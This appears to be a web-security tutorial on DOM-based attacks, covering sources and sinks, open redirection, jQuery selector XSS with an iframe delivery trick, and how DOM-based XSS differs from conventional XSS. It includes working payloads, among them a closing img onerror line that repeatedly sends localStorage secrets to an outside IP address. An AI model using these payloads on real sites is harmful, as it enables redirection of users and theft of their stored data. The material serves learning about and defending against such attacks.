## 🚰 DOM Sources and Sinks

All DOM-based attacks originate from untrusted user input interacting with JavaScript that modifies the Document Object Model. Detection relies on identifying sources and sinks. A source is the entry point of untrusted user data into a JavaScript execution context. A sink is the execution point where data modifies the DOM. Absence of sanitization or validation between source and sink enables exploitation.



| Context | Source | Sink |
|---|---|---|
| Navigation Tab | URL fragment updated to indicate active tab. | JavaScript triggers on URL update, extracting tab state to render component. |
| Data Filtering | Textbox input provided by client. | JavaScript triggers on textbox update, applying input to filter dataset. |

The URL fragment operator is commonly utilized to maintain state or position. Parsing fragment data without strict validation introduces DOM-based vulnerabilities.

## ↪️ DOM-Based Open Redirection

Navigation logic relying on fragment values can be manipulated for arbitrary redirection.

```javascript
# Extract fragment value and redirect client if URL begins with https:
goto = location.hash.slice(1);
if (goto.startsWith('https:')) {
   location = goto;
}
```
* Tool: Client-side JavaScript

The source `location.hash.slice(1)` extracts the fragment. It is directly assigned to the DOM `location` sink without sanitization.

```text
# Malicious URL structure to force redirection
[https://realwebsite.com/#https://attacker.com](https://realwebsite.com/#https://attacker.com)
```
* Tool: Web Browser

Upon DOM load, the script extracts the target URL and forces a client-side redirect to the attacker-controlled domain.

## 💉 DOM-Based XSS via jQuery

Framework-specific sinks, such as jQuery selectors, present additional DOM exploitation vectors.

```javascript
# jQuery event listener passing fragment data into a selector sink
$(window).on('hashchange', function() {
    var element = $(location.hash);
    element[0].scrollIntoView();
});
```
* Tool: Client-side JavaScript

The fragment value is passed into the `$()` selector sink. Direct URL injection results in self-XSS:

```text
# Direct XSS payload injection via URL fragment
[https://realwebsite.com](https://realwebsite.com)#<img src=1 onerror=alert(1)></img>
```
* Tool: Web Browser

Weaponization against external targets requires an automated trigger mechanism. An iframe can force a `hashchange` event on the victim's client.

```html
# Delivery mechanism via iframe to trigger hashchange on target
<iframe src="[https://realwebsite.com](https://realwebsite.com)#" onload="this.src+='<img src=1 onerror=alert(1)>'">
```
* Tool: Malicious Web Server

## ⚖️ DOM-Based vs Conventional XSS

Vulnerability classification depends on sink location.

* Conventional XSS: Untrusted data is injected server-side. The initial HTTP response contains the malicious payload. Remediation requires robust server-side HTML entity encoding.
* DOM-Based XSS: The DOM loads completely, then dynamically receives and processes untrusted data via client-side JavaScript. Remediation requires substituting vulnerable JavaScript functions with safer alternatives or implementing strict client-side validation.

Below is an advanced DOM-based payload utilizing the fetch API for continuous data exfiltration:

```html
# Image vector utilizing setInterval to persistently exfiltrate local storage via HTTP GET
<img src=1 onerror="setInterval(()=>{fetch('[http://192.168.146.182:8000?secret='+localStorage.getItem('secret](http://192.168.146.182:8000?secret='+localStorage.getItem('secret)'))},5000)">
```
* Tool: XSS Payload Delivery
